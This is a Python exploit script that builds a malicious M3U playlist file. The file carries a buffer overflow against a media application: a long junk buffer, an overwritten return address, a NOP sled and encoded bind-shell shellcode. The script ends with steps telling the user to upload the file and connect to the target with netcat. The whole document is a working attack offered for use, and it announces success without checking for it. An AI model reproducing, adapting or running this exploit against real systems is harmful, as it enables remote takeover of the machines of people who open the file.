#Setting the file header, top line and the first part of the url that will not be fuzzed
header="#EXTM3U\r\n"
top_line="#EXTINF:123, Sample artist - Sample title\r\n"
url_part1="http://www."

#Configuring the payload to create the fuzzing files
junk1="A"*35069
eip="\x4D\x6D\x19\x78"
junk2="\x43"*16
nops="\x90"*16

#This is the bind shell
buf =  ""
buf += "\x2b\xc9\x83\xe9\xae\xe8\xff\xff\xff\xff\xc0\x5e\x81"
buf += "\x76\x0e\x8e\xbe\x87\xf0\x83\xee\xfc\xe2\xf4\x72\x56"
buf += "\x05\xf0\x8e\xbe\xe7\x79\x6b\x8f\x47\x94\x05\xee\xb7"
buf += "\x7b\xdc\xb2\x0c\xa2\x9a\x35\xf5\xd8\x81\x09\xcd\xd6"
buf += "\xbf\x41\x2b\xcc\xef\xc2\x85\xdc\xae\x7f\x48\xfd\x8f"
buf += "\x79\x65\x02\xdc\xe9\x0c\xa2\x9e\x35\xcd\xcc\x05\xf2"
buf += "\x96\x88\x6d\xf6\x86\x21\xdf\x35\xde\xd0\x8f\x6d\x0c"
buf += "\xb9\x96\x5d\xbd\xb9\x05\x8a\x0c\xf1\x58\x8f\x78\x5c"
buf += "\x4f\x71\x8a\xf1\x49\x86\x67\x85\x78\xbd\xfa\x08\xb5"
buf += "\xc3\xa3\x85\x6a\xe6\x0c\xa8\xaa\xbf\x54\x96\x05\xb2"
buf += "\xcc\x7b\xd6\xa2\x86\x23\x05\xba\x0c\xf1\x5e\x37\xc3"
buf += "\xd4\xaa\xe5\xdc\x91\xd7\xe4\xd6\x0f\x6e\xe1\xd8\xaa"
buf += "\x05\xac\x6c\x7d\xd3\xd6\xb4\xc2\x8e\xbe\xef\x87\xfd"
buf += "\x8c\xd8\xa4\xe6\xf2\xf0\xd6\x89\x41\x52\x48\x1e\xbf"
buf += "\x87\xf0\xa7\x7a\xd3\xa0\xe6\x97\x07\x9b\x8e\x41\x52"
buf += "\x9a\x86\xe7\xd7\x12\x73\xfe\xd7\xb0\xde\xd6\x6d\xff"
buf += "\x51\x5e\x78\x25\x19\xd6\x85\xf0\x91\x2f\x0e\x16\xe4"
buf += "\xae\xd1\xa7\xe6\x7c\x5c\xc7\xe9\x41\x52\xa7\xe6\x09"
buf += "\x6e\xc8\x71\x41\x52\xa7\xe6\xca\x6b\xcb\x6f\x41\x52"
buf += "\xa7\x19\xd6\xf2\x9e\xc3\xdf\x78\x25\xe6\xdd\xea\x94"
buf += "\x8e\x37\x64\xa7\xd9\xe9\xb6\x06\xe4\xac\xde\xa6\x6c"
buf += "\x43\xe1\x37\xca\x9a\xbb\xf1\x8f\x33\xc3\xd4\x9e\x78"
buf += "\x87\xb4\xda\xee\xd1\xa6\xd8\xf8\xd1\xbe\xd8\xe8\xd4"
buf += "\xa6\xe6\xc7\x4b\xcf\x08\x41\x52\x79\x6e\xf0\xd1\xb6"
buf += "\x71\x8e\xef\xf8\x09\xa3\xe7\x0f\x5b\x05\x77\x45\x2c"
buf += "\xe8\xef\x56\x1b\x03\x1a\x0f\x5b\x82\x81\x8c\x84\x3e"
buf += "\x7c\x10\xfb\xbb\x3c\xb7\x9d\xcc\xe8\x9a\x8e\xed\x78"
buf += "\x25"


payload=junk1+eip+nops+buf+junk2
url_part2=".com/test.m3u"

#this will create an m3u file that we will upload to the application
try:
	exploit_file=open("m3u_bind_file.m3u","w")
	exploit_file.write(header+top_line+url_part1+payload+url_part2)
except Exception as error:
	print ("[!]Could not create file")

#upon successful connection
print("[+]Exploit successful")
print("[+]An m3u file has been created: m3u_bind_file.m3u")
print("[+] Upload this m3u file to the app to exploit")
print("[+]You can then connect to the target machine using the IP and port")
print ("[+]Example: nc 192.168.56.104 8081")